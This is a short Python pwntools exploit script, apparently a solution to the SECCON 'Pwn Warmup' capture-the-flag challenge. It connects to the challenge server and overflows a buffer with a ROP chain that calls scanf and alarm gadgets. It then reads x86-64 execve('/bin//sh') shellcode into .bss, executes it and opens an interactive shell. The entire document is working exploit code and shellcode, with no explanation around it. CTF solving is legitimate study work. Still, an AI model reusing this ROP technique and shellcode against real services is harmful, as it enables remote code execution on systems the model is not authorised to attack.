from pwn import *

context.arch = 'amd64'

con = remote('pwn-neko.chal.seccon.jp', 9001)

bss = 0x600e00
poprdi = 0x4007e3
poprsi = 0x4007e1
shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

con.recvregex('Welcome to Pwn Warmup!\n')

payload = 'A' * 32
payload += pack(bss)

payload += pack(poprdi)
payload += pack(0x40081b)
payload += pack(poprsi)
payload += pack(bss)
payload += pack(0)
payload += pack(0x4005c0) # scanf@plt

payload += pack(poprdi)
payload += pack(bss)
payload += pack(0x4005a0) # alarm@plt

payload += pack(poprdi)
payload += pack(0)
payload += pack(0x4005a0) # alarm@plt

payload += pack(0x400560) # call rax

con.sendline(payload)
con.sendline(shellcode)

con.interactive()